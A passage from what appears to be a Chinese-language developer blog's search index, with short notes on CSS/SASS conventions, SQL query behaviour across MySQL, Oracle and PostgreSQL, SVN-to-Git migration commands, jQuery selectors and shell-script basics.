a.logo</h3><p>.header .logo a<br>.header a.logo</p>\n<p>寫 CSS 不要指定 html tag 跟 class 連在一起<br>這樣有失彈性</p>\n<p>這上面還有一個問題<br>logo 不可能出現 header 上面<br>所以可以用</p>\n<h3 id=\"SASS-使用變數技巧\"><a href=\"#SASS-使用變數技巧\" class=\"headerlink\" title=\"SASS 使用變數技巧\"></a>SASS 使用變數技巧</h3><p>不要用<code>語意</code><br>錯誤範例 EX: .booksList,.carsList<br>這樣明明這些都是一樣東西<br>但每頁應該可以套同一個 CSS class<br>如: .list, .l-list(可以家前綴)</p>\n<p>使用變數技巧</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$red: red;</span><br><span class=\"line\">$body-color: $red;</span><br></pre></td></tr></table></figure>\n<p>這樣網站在改顏色的時候非常好調整<br>可以參考 bootstrap 原碼<br><a href=\"https://github.com/twbs/bootstrap/blob/master/scss/_variables.scss\" target=\"_blank\" rel=\"noopener\">bootstrap/_variables.scss at master · twbs/bootstrap</a></p>\n<p><strong>語意的部分還是交給 html 吧</strong></p>\n<p>backimage 圖片沒有重複使用，也不要用成變數<br>除非有特別關係(通常應該不會)</p>\n<p>利用變數技巧一次產生多個 class 方法<br><a href=\"https://github.com/twbs/bootstrap/blob/master/scss/_utilities.scss\" target=\"_blank\" rel=\"noopener\">bootstrap/_utilities.scss at master · twbs/bootstrap</a></p>\n<h2 id=\"結構辨別的種類\"><a href=\"#結構辨別的種類\" class=\"headerlink\" title=\"結構辨別的種類\"></a>結構辨別的種類</h2><ol>\n<li>佈局 layout、頁面 page (只出現一處)</li>\n<li>工具 helper、utilities</li>\n<li>模組 module (出現兩處以上)</li>\n<li>容器 container、grid</li>\n</ol>\n<h2 id=\"其他寫-CSS-可能需要注意的事情\"><a href=\"#其他寫-CSS-可能需要注意的事情\" class=\"headerlink\" title=\"其他寫 CSS 可能需要注意的事情\"></a>其他寫 CSS 可能需要注意的事情</h2><h3 id=\"float-做響應式可能需要注意的事\"><a href=\"#float-做響應式可能需要注意的事\" class=\"headerlink\" title=\"float 做響應式可能需要注意的事\"></a>float 做響應式可能需要注意的事</h3><p>.fl{<br>float:left;<br>}</p>\n<p>但需要注意到手機全版建議取消 float</p>\n<h3 id=\"少指定-width-height-數值\"><a href=\"#少指定-width-height-數值\" class=\"headerlink\" title=\"少指定 width,height 數值\"></a>少指定 width,height 數值</h3><p>使用格線系統具有彈性</p>\n<h3 id=\"其他使用-SASS-技巧\"><a href=\"#其他使用-SASS-技巧\" class=\"headerlink\" title=\"其他使用 SASS 技巧\"></a>其他使用 SASS 技巧</h3><h4 id=\"容器單一寫-CSS\"><a href=\"#容器單一寫-CSS\" class=\"headerlink\" title=\"容器單一寫 CSS\"></a>容器單一寫 CSS</h4><p>錯誤範例<br>ex:<br>.col-3 .col-12<br>.col-12 .img</p>\n<p>正確寫法</p>\n<p>.col-12<br>.img</p>\n<p>####前綴可以對應放置 SASS 資料夾<br>.p-about 放在 page<br>.l-list 放在 layout<br>再找 CSS 位置會特別直覺</p>\n<h4 id=\"使用-page-做每頁分類\"><a href=\"#使用-page-做每頁分類\" class=\"headerlink\" title=\"使用 page 做每頁分類\"></a>使用 page 做每頁分類</h4><p>不要寫出多份 SASS(產生多個 css ex:about.css home.css)<br>只需要寫一個 SASS(產生一個 css ex:all.css)<br>這個好處在拆分 css 模組化會比較有幫助</p>\n<h4 id=\"page-module-比較\"><a href=\"#page-module-比較\" class=\"headerlink\" title=\"page module 比較\"></a>page module 比較</h4><p>page vs module<br>page 只有當頁有用到<br>module 有很多頁會用到</p>\n<h4 id=\"不知道歸類方法\"><a href=\"#不知道歸類方法\" class=\"headerlink\" title=\"不知道歸類方法\"></a>不知道歸類方法</h4><p>在不知道要放在哪邊情況下<br>可以先放在<code>inbox</code>資料夾<br>方便以後知道後再做移轉</p>\n<h4 id=\"最後思考\"><a href=\"#最後思考\" class=\"headerlink\" title=\"最後思考\"></a>最後思考</h4><p>是否能將 Layout 與 Page 重構為 module?</p>\n<p>先記錄這樣…，我還有格線系統沒紀錄 orz</p>\n","categories":["SASS"],"tags":["css"]},{"title":"SQL Between ... AND ...  順序有差","url":"/blog/2020/09/08/SQL-Between-AND-%E9%A0%86%E5%BA%8F%E6%9C%89%E5%B7%AE/","content":"<p>今天寫 Oracle 時候發現 between sysdate and sysdate -1 竟然不能查詢<br>原來看一下文件，順序真的是有差的</p>\n<a id=\"more\"></a>\n<h2 id=\"Oracle\"><a href=\"#Oracle\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h2><blockquote>\n<p>is the value of the boolean expression:<br>expr2 &lt;= expr1 AND expr1 &lt;= expr3<br>If expr3 &lt; expr2, then the interval is empty. If expr1 is NULL, then the result is NULL. If expr1 is not NULL, then the value is FALSE in the ordinary case and TRUE when the keyword NOT is used.</p>\n</blockquote>\n<p><a href=\"https://docs.oracle.com/cd/B28359_01/server.111/b28286/conditions011.htm#SQLRF52147\" target=\"_blank\" rel=\"noopener\">Oracle BETWEEN Conditions</a></p>\n<h2 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h2><blockquote>\n<p>If expr is greater than or equal to min and expr is less than or equal to max, BETWEEN returns 1, otherwise it returns 0. This is equivalent to the expression (min &lt;= expr AND expr &lt;= max) if all the arguments are of the same type. Otherwise type conversion takes place according to the rules described in Section 12.3, “Type Conversion in Expression Evaluation”, but applied to all the three arguments. </p>\n</blockquote>\n<p><a href=\"https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html#operator_between\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL 8.0 Reference Manual :: 12.4.2 Comparison Functions and Operators</a></p>\n","categories":["SQL"],"tags":["sql","between"]},{"title":"SQL JOIN LIMIT 表做查詢優化","url":"/blog/2019/07/10/SQL-JOIN-LIMIT-%E8%A1%A8%E5%81%9A%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96/","content":"<p>最近公司上線 APP 的某一筆資料原本要做例外排除<br>但是沒有做<br>因為這一筆資料會撈出過多的方法<br>APP 已經審查過<br>所以沒辦法更動 APP<br>只能看有沒有比較優的查詢方法<br>但是有網路找到一個方法</p>\n<a id=\"more\"></a>\n<p>之前就有看過類似方法<br>不過都沒有紀錄<br>今天遇到，原本想說很複雜的 SQL 可能沒有什麼效果<br>但是今天用了一下<br>還不錯</p>\n<blockquote>\n<p>SELECT * FROM test AS t<br>INNER JOIN ( SELECT id FROM test ORDER BY post_time DESC LIMIT 15000,10 ) AS s<br>ON t.id=s.id<br>我相信 , 這道指令應該 1 秒都不用<br>為何會如此呢 ?<br>因為我們在 subquery 中只有抓 id , 這樣 mysql 就只需要少量記憶體就可以存放資料列進行排序 , 原始的作法就是每一列有多少資料 , mysql 就必須分配多少記憶體 , 如果資料數太大 , 記憶體不夠分配 , 自然就是用 disk 了<br>但如果我們要抓的資料只是前面幾筆 , 例如 LIMIT 100,10 , 那麼原本的寫法會比較快 , 因此這可以在程式中判斷而交互使用兩種 QUERY 的方式<br><a href=\"https://www.pigo.idv.tw/archives/390\" target=\"_blank\" rel=\"noopener\">善用 sub query 優化 order by limit | 壞蛋的密室</a></p>\n</blockquote>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span></span><br><span class=\"line\">xxx</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> xxx x1</span><br><span class=\"line\"><span class=\"keyword\">INNER</span> <span class=\"keyword\">JOIN</span>  s <span class=\"keyword\">ON</span> x1.id = s.id</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span>  pl <span class=\"keyword\">ON</span> pl.id = x1.id</span><br><span class=\"line\"><span class=\"keyword\">INNER</span> <span class=\"keyword\">JOIN</span> (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">id</span> <span class=\"keyword\">FROM</span> pl pl2 <span class=\"keyword\">WHERE</span> xxx_id <span class=\"keyword\">IN</span> (</span><br><span class=\"line\"><span class=\"keyword\">select</span> oo <span class=\"keyword\">FROM</span> ss <span class=\"keyword\">where</span> oo.id = ___ <span class=\"keyword\">AND</span> o.condition1 = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">AND</span> o.condition2 = <span class=\"number\">1</span></span><br><span class=\"line\">) <span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> counts <span class=\"keyword\">desc</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">500</span>) <span class=\"keyword\">as</span> a <span class=\"keyword\">ON</span> pl.id = a.id</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> s.id = ___</span><br><span class=\"line\"><span class=\"keyword\">AND</span> ...</span><br><span class=\"line\"><span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> pl.counts <span class=\"keyword\">DESC</span></span><br><span class=\"line\"><span class=\"keyword\">LIMIT</span> <span class=\"number\">0</span>, <span class=\"number\">500</span></span><br></pre></td></tr></table></figure>\n<p>沒想到這麼複雜 SQL 也可以這麼快</p>\n","categories":["SQL"],"tags":["sql","join"]},{"title":"SQL: UPDATE ... SET ... FROM 用法","url":"/blog/2021/06/02/SQL-UPDATE-SET-FROM-%E7%94%A8%E6%B3%95/","content":"<p>最近看到 PostgresSQL 看到 Update … set … from …<br>看到怎麼會有 from  用再 Update</p>\n<a id=\"more\"></a>\n<p>後來看了一下<br><a href=\"https://www.itread01.com/content/1499088123.html\" target=\"_blank\" rel=\"noopener\">sql update set from 的用法 (轉) - IT閱讀</a></p>\n<p>原來是 join 表</p>\n<p>後來發現 MySQL 不能用這個寫法<br>但我印象中有用過</p>\n<p><a href=\"https://malagege.github.io/blog/2019/08/16/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/\">SQL UPDATE 和 DELETE 趴配 JOIN 方法 | 程式狂想筆記</a><br><a href=\"https://bbs.csdn.net/topics/270012894\" target=\"_blank\" rel=\"noopener\">mysql 可不可以使用 update from 这样语句啊 -CSDN论坛</a></p>\n","categories":["SQL"],"tags":["sql"]},{"title":"SQL UPDATE 和 DELETE 趴配 JOIN 方法","url":"/blog/2019/08/16/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/","content":"<p>最近看到 UPDATE 和 DELETE<br>可以搭配用 JOIN 方式<br>這種常常查詢資料都要搭配程式 for 迴圈實作<br>我覺得非常實用</p>\n<a id=\"more\"></a>\n<p>我網路隨便找一個範例<br><a href=\"http://sqlfiddle.com/#!9/86b033/1\" target=\"_blank\" rel=\"noopener\">SQL Fiddle</a></p>\n<h2 id=\"UPDATE-…-INNER-JOIN\"><a href=\"#UPDATE-…-INNER-JOIN\" class=\"headerlink\" title=\"UPDATE … INNER JOIN\"></a>UPDATE … INNER JOIN</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> comentarios a</span><br><span class=\"line\">       <span class=\"keyword\">INNER</span> <span class=\"keyword\">JOIN</span> respuestas b</span><br><span class=\"line\">               <span class=\"keyword\">ON</span> a.comentario_servicio = b.respuesta_servicio</span><br><span class=\"line\"><span class=\"keyword\">SET</span>    a.comentario_servicio = <span class=\"string\">'fff'</span>,</span><br><span class=\"line\">       b.respuesta_servicio = <span class=\"string\">'ccc'</span></span><br><span class=\"line\"><span class=\"keyword\">WHERE</span>  b.respuesta_servicio = <span class=\"string\">'T.I'</span></span><br></pre></td></tr></table></figure>\n<p>透過 <code>JOIN</code> 方式可以同時改兩張表的資料<br>但還有更神奇的妙用<br>就是把<code>b</code>表換成子查詢<br>可以用 JOIN 方式改變<code>a</code>表的內容<br>省了寫程式 code<br><strong>超級實用</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> comentarios a</span><br><span class=\"line\">       <span class=\"keyword\">INNER</span> <span class=\"keyword\">JOIN</span> (<span class=\"keyword\">SELECT</span></span><br><span class=\"line\">          xxx,</span><br><span class=\"line\">          <span class=\"keyword\">if</span>(xxx,ooo,bbb) <span class=\"keyword\">as</span> set_value</span><br><span class=\"line\">          <span class=\"keyword\">FROM</span> ....</span><br><span class=\"line\">          ....</span><br><span class=\"line\">          ...</span><br><span class=\"line\">       ) b</span><br><span class=\"line\">        <span class=\"keyword\">ON</span> a.comentario_servicio = b.respuesta_servicio</span><br><span class=\"line\"><span class=\"keyword\">SET</span>    a.comentario_servicio = set_value</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span>  b.respuesta_servicio = <span class=\"string\">'T.I'</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"DELETE-…-INNER-JOIN\"><a href=\"#DELETE-…-INNER-JOIN\" class=\"headerlink\" title=\"DELETE … INNER JOIN\"></a>DELETE … INNER JOIN</h2><p>DELETE 也能搭配 JOIN<br>不過有點跟原本 DELETE 不太一樣</p>\n<p>如下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DELETE</span> a,b</span><br><span class=\"line\"><span class=\"keyword\">FROM</span>       comentarios a</span><br><span class=\"line\"><span class=\"keyword\">INNER</span> <span class=\"keyword\">JOIN</span> respuestas b</span><br><span class=\"line\"><span class=\"keyword\">ON</span>         a.comentario_servicio = b.respuesta_servicio</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span>      b.respuesta_servicio = <span class=\"string\">'T.I'</span>;</span><br></pre></td></tr></table></figure>\n<p>通常穩們用的 DELETE 都是改<code>from</code>表<br>但 JOIN 不是這樣，是針對 DELETE 後面 table 命名 a,b 做刪除<br>當然也可以不用刪除兩張表<br><code>DELETE a FROM ...</code><br>或<br><code>DELETE b FROM ...</code><br>都可以指定刪除</p>\n<p>此招也很實用</p>\n<h2 id=\"鎖表的問題\"><a href=\"#鎖表的問題\" class=\"headerlink\" title=\"鎖表的問題\"></a>鎖表的問題</h2><p>上面妙招還是會有一些缺點<br>SQL 鎖表對一些資料表會造成些問題<br>有爬到<a href=\"https://www.cnblogs.com/paul8339/p/6877729.html\" target=\"_blank\" rel=\"noopener\">mysql insert 锁机制【转】 - paul_hch - 博客园</a> <a href=\"/blog/2019/08/16/SQL-UPDATE-和-DELETE-趴配-JOIN-方法/web1.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>SQL 也有一些實用用法</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> xxx SELECT...</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">REPLACE INTO ....</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> .... <span class=\"keyword\">ON</span> <span class=\"keyword\">DUPLICATE</span> <span class=\"keyword\">KEY</span> <span class=\"keyword\">UPDATE</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/abysscarry/article/details/80518278\" target=\"_blank\" rel=\"noopener\">（mysql）replace into …与 insert into … on duplicate key update 对比分析 - Abysscarry 的博客 - CSDN 博客</a><br><a href=\"https://www.cnblogs.com/jkko123/p/7285641.html\" target=\"_blank\" rel=\"noopener\">mysql 中 replace into 与 insert into on duplicate key update 的使用和不同点 - 怀素真 - 博客园</a><br><a href=\"https://blog.csdn.net/xlxxcc/article/details/52439734\" target=\"_blank\" rel=\"noopener\">MySQL 的 Replace into 与 Insert into on duplicate key update 真正的不同之处 - xlxxcc 的专栏 - CSDN 博客</a></p>\n","categories":["MySQL"],"tags":["mysql","delete","insert"]},{"title":"SQL not in & in 拆開寫法","url":"/blog/2018/07/03/SQL-not-in-in-%E6%8B%86%E9%96%8B%E5%AF%AB%E6%B3%95/","content":"<p>今天思緒有點短路，做SQL用程式組兩個<code>NOT IN</code><br><del>竟然用<code>OR</code>，可能覺得跟IN一樣</del><br>但事後想想應該是要用<code>AND</code><br>不可能有一個要<code>NOT IN</code>另外一個不用<code>NOT IN</code></p>\n<p>好了這個雷紀錄一下，不要再踩到</p>\n<ul>\n<li>IN(xxx,ooo)  =&gt; IN (xxx) or  IN(ooo)=</li>\n<li>NOT IN(xxx,ooo)  =&gt; NOT IN (xxx) AND  NOT IN(ooo)</li>\n</ul>\n","categories":["SQL"],"tags":["sql","IN","NOT IN"]},{"title":"SQL union 排序的問題","url":"/blog/2019/05/20/SQL-union-%E6%8E%92%E5%BA%8F%E7%9A%84%E5%95%8F%E9%A1%8C/","content":"<p>union 要做排序要放在最下面</p>\n<p>select seq from ooo<br>union<br>select null as seq from xxx</p>\n<p>seq 全部都會變成 null</p>\n<p>最近太忙了<br>先記錄到這邊<br>有空在研究<br><a href=\"https://wuaner.iteye.com/blog/559781\" target=\"_blank\" rel=\"noopener\">UNION 中 ORDER By 的使用 - 不要依赖这里 因为你有大脑 - ITeye 博客</a></p>\n","categories":["SQL"],"tags":["sql","union"]},{"title":"SQL 做時間判斷條件需要注意的事情","url":"/blog/2019/08/27/SQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/","content":"<p>好幾次採到 SQL 時間的地雷<br>今天來好好筆記</p>\n<a id=\"more\"></a>\n<h2 id=\"datetime-between-‘2019-01-01’-and-‘2019-02-01’\"><a href=\"#datetime-between-‘2019-01-01’-and-‘2019-02-01’\" class=\"headerlink\" title=\"datetime between ‘2019-01-01’ and ‘2019-02-01’\"></a>datetime between ‘2019-01-01’ and ‘2019-02-01’</h2><p>這個時候需要注意!!<br>由於 between 沒有放入時間資料<br>查詢結果會是 <code>2019-01-01 00:00:00</code> ~ <code>2019-02-01 00:00:00</code><br>所以需要使用 <code>2019-01-01 00:00:00</code> ~ <code>2019-01-31 23:59:59</code></p>\n<h2 id=\"MySQL-‘0000-00-00’-0-會是-true\"><a href=\"#MySQL-‘0000-00-00’-0-會是-true\" class=\"headerlink\" title=\"MySQL ‘0000-00-00’ = 0 會是 true\"></a>MySQL ‘0000-00-00’ = 0 會是 true</h2><p>之前讀到 MySQL ‘0000-00-00’ 可等於 null<br>但是 ‘0000-00-00’ = ‘’ 會是 false<br>‘0000-00-00’ = 0 為 true<br>這邊就是<code>隱式轉換</code><br>可看下面標題</p>\n<h2 id=\"隱式轉換\"><a href=\"#隱式轉換\" class=\"headerlink\" title=\"隱式轉換\"></a>隱式轉換</h2><p>‘123_ff’ = 1  為true</p>\n<p><a href=\"http://zzzsdust.com/articles/23/\" target=\"_blank\" rel=\"noopener\">MySQL 隐式类型转换 - ZZZ’s blog</a><br><a href=\"https://blog.devopszen.com/mysql_params\" target=\"_blank\" rel=\"noopener\">价值百万的 MySQL 的隐式类型转换 - 互联网技术和架构</a><br><a href=\"https://www.cnblogs.com/rollenholt/p/5442825.html\" target=\"_blank\" rel=\"noopener\">MySQL隐式转化整理 - Rollen Holt - 博客园</a></p>\n<p>其他想到在記錄!!</p>\n<h2 id=\"其他小記\"><a href=\"#其他小記\" class=\"headerlink\" title=\"其他小記\"></a>其他小記</h2><p><a href=\"https://blog.csdn.net/li19236/article/details/51701374\" target=\"_blank\" rel=\"noopener\">Oracle时间类型数据为0的bug(0000-0-0) - 北国风光的专栏 - CSDN博客</a></p>\n","categories":["MySQL"],"tags":["sql"]},{"title":"SSL Pinning 和 HSTS 小記","url":"/blog/2020/06/18/SSL-Pinning-%E5%92%8C-HSTS-%E5%B0%8F%E8%A8%98/","content":"<p>TODO: 有空詳細補</p>\n<a id=\"more\"></a>\n<h2 id=\"SSL-Pinning\"><a href=\"#SSL-Pinning\" class=\"headerlink\" title=\"SSL Pinning\"></a>SSL Pinning</h2><p><a href=\"https://www.sslbuyer.com/index.php?option=com_content&amp;view=article&amp;id=177:fix-ssl-vulnerabilities&amp;catid=25&amp;Itemid=2595\" target=\"_blank\" rel=\"noopener\">SSL漏洞修正方式 - SSL憑證推薦網 | SSL憑證 | code Sign</a></p>\n<p><a href=\"https://yu-jack.github.io/2020/03/02/ssl-pinning/\" target=\"_blank\" rel=\"noopener\">從 SSL 到 SSL Pinning 看完你就懂！ - 技術雜記 Technology Notes - Jack Yu | 傑克</a></p>\n<p><a href=\"https://github.com/dialogs/electron-ssl-pinning\" target=\"_blank\" rel=\"noopener\">dialogs/electron-ssl-pinning: Prevents MITM in Electron applications</a></p>\n<h2 id=\"HSTS\"><a href=\"#HSTS\" class=\"headerlink\" title=\"HSTS\"></a>HSTS</h2><p><a href=\"https://blog.macs1207.dev/\" target=\"_blank\" rel=\"noopener\">https://blog.macs1207.dev/</a></p>\n","categories":["Apache"],"tags":["https","tls","hsts"]},{"title":"SVN 移轉 GIT 小記","url":"/blog/2021/02/21/SVN-%E7%A7%BB%E8%BD%89-GIT-%E5%B0%8F%E8%A8%98/","content":"<p>最近公司 SVN Repository 要備廢除<br>由於先前案子是使用 SVN，此專案也是交接下來的<br>不希望把 SVN 修改記錄刪除<br>很多專案都是把檔案從丟新的到 GIT<br>但我不是這樣做<br>花了一點時間找工具轉<br>趕緊紀錄，因為沒有在家實作<br>所以大概季錄一下</p>\n<a id=\"more\"></a>\n<h2 id=\"能使用工具\"><a href=\"#能使用工具\" class=\"headerlink\" title=\"能使用工具\"></a>能使用工具</h2><ul>\n<li>subgit</li>\n<li>svn2git</li>\n<li>git svn</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">subgit import --non-interactive --default-domain xxxx.com.tw --svn-url https://IP/svn/project  project.git</span><br></pre></td></tr></table></figure>\n<p>原本要用 subgit ，但下載發現好像有期限<br>但執行照一般指令，沒有成功(但好像是SVN帳號或 我忘了連VPN)<br>sub2git 也跳出底程指令不能跑<br>我看他使用 git svn 就研究了一下<br>好像跳出帳號密碼驗證失敗</p>\n<h2 id=\"SVN-輸入帳號轉-GIT\"><a href=\"#SVN-輸入帳號轉-GIT\" class=\"headerlink\" title=\"SVN 輸入帳號轉 GIT\"></a>SVN 輸入帳號轉 GIT</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install git-svn</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git svn <span class=\"built_in\">clone</span>  svn://server/repo  --username user</span><br><span class=\"line\"><span class=\"comment\"># svn: 可以改 https://</span></span><br><span class=\"line\">git svn <span class=\"built_in\">clone</span> https://IP/svn/xxx/oooo --username=xxx</span><br></pre></td></tr></table></figure>\n<p>輸入完跳出密碼就可以轉了<br><code>-r1450:HEAD</code><br>可以限制版本從哪邊開始</p>\n<p>參考找的資料<br><a href=\"https://amobiz.github.io/2014/09/07/convert-svn-local-repository-to-git-local-repository-windows/\" target=\"_blank\" rel=\"noopener\">將 SVN Local Repository 轉換為 Git Local Repository (Windows) | 格物致知</a></p>\n<p><a href=\"https://blog.alantsai.net/posts/2017/06/git-svn-usage\" target=\"_blank\" rel=\"noopener\">[git]開始使用git - 用git操作svn repo @ Alan Tsai 的學習筆記｜A Microsoft MVP, MCT, Blogger, Youtuber and ASP .NET Developer Blog</a></p>\n<p><a href=\"http://www.tastones.com/zh-tw/stackoverflow/git/migrating-to-git/migrate_from_svn_to_git_using_svn2git/\" target=\"_blank\" rel=\"noopener\">使用 svn2git 從 SVN 遷移到 Git | 他山教程，只選擇最優質的自學材料</a></p>\n<p><a href=\"https://stackoverflow.com/questions/21040553/git-svn-clone-password-pass-gives-unknown-option-password\" target=\"_blank\" rel=\"noopener\">git svn clone –password pass gives “Unknown option: password” - Stack Overflow</a></p>\n<p><a href=\"https://stackoverflow.com/questions/27240428/git-svn-migration-failing-with-svn-1-8\" target=\"_blank\" rel=\"noopener\">git svn migration failing with svn 1.8 - Stack Overflow</a></p>\n<p><a href=\"https://stackoverflow.com/questions/747075/how-to-git-svn-clone-the-last-n-revisions-from-a-subversion-repository\" target=\"_blank\" rel=\"noopener\">How to git-svn clone the last n revisions from a Subversion repository? - Stack Overflow</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"CSS Selector做空白可能要注意的事情","url":"/blog/2019/01/08/Selector%E5%81%9A%E7%A9%BA%E7%99%BD%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/","content":"<p>最近 jQuery 使用<code>.siblings(&#39;:first-child + ~ &#39;);</code><br>感覺哪裡怪怪的<br>前陣子我踩了<code>div :hover</code>地雷(我心中所想的是<code>div:hover</code>)<br>結果差很多…<br>太少寫 CSS 犯了低級的錯誤….<br>但我今天看到這個<code>.siblings(&#39;:first-child + ~&#39;);</code>怎麼可以跑…..</p>\n<a id=\"more\"></a>\n<p>其實我猜測在做<code>~+</code>的時候前後空白會被忽略<br>因為之前不小心寫<code>div :hover</code><br>我覺得正常前後不要空白比較好</p>\n<p>雖然我還沒看到相關文件有說前後可以空白<br>不過自己實驗<code>~+</code>前後空白不會有這個問題</p>\n<p>最後無聊提醒<a href=\"https://malagege.github.io/blog/2017/04/29/logdown/2017-04-29-1767277/\">[CSS] 不常用的 CSS Selectors 筆記 | 程式狂想筆記</a><br>jQuery 的 siblings 跟 CSS 的<code>~</code>是不一樣的<br>jQuery 的 siblings 是除了自己本身 selector 同階層都會抓到<br>但是 CSS<code>xxx~</code>是 xxx 後面屬性都會抓到</p>\n<p><code>element1+</code>跟<code>element1~</code>都可以跑<br>好奇怪為什麼這樣還是可以跑<br>目前猜測後面沒寫<code>element1+</code>，會自動帶<code>*</code><br>所以跟結果<code>element1+*</code>一樣<br>不過我還是沒有找到文章<br>日後看到會再補充</p>\n<p>最後我自己又重新看 code 一次<br><code>.siblings(&#39;:first-child + ~&#39;);</code><br>其實我這個寫法可以這樣寫<code>.siblings(&#39;:first-child~&#39;);</code><br>甚至可以用 jQuery<code>not</code>function 使用<br><code>.siblings().not(:first-child);</code><br>我很少用複查的寫法</p>\n<p>這個 js 用途是用在做多列 table，點擊一個按鈕，需要把其他列資料隱藏起來<br>所以才用這個方法<br>但我最近發現 table 結構</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>標題<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>其實這樣編排的話不需要做這麼複雜的事情<br>我可以對 tbody 做比較不需要寫複雜的 code<br><strong>不過說真的 thead 跟 tbody 沒寫的時候</strong><br>瀏覽器其實會幫你建立的<br>這通常自己會忘記(已經踩好幾次了 orz)</p>\n","categories":["CSS"],"tags":["css"]},{"title":"Shell Script 小記","url":"/blog/2019/10/23/Shell-Script-%E5%B0%8F%E8%A8%98/","content":"<h2 id=\"shell-小記\"><a href=\"#shell-小記\" class=\"headerlink\" title=\"shell 小記\"></a>shell 小記</h2><a id=\"more\"></a>\n<h3 id=\"變數大寫\"><a href=\"#變數大寫\" class=\"headerlink\" title=\"變數大寫\"></a>變數大寫</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">TODAY=`date +<span class=\"string\">\"%Y%m%d\"</span>`</span><br><span class=\"line\">YESTERDAY=`date +<span class=\"string\">\"%Y%m%d\"</span>  --date=<span class=\"variable\">$&#123;TODAY&#125;</span>-1day`</span><br></pre></td></tr></table></figure>\n<h2 id=\"變數宣告-不能有空白\"><a href=\"#變數宣告-不能有空白\" class=\"headerlink\" title=\"變數宣告 = 不能有空白\"></a>變數宣告 = 不能有空白</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">A = 1234 <span class=\"comment\"># A: command not found</span></span><br><span class=\"line\">B=1234   <span class=\"comment\"># Success</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"字串截取\"><a href=\"#字串截取\" class=\"headerlink\" title=\"字串截取\"></a>字串截取</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">STRING=<span class=\"string\">\"123456789\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span 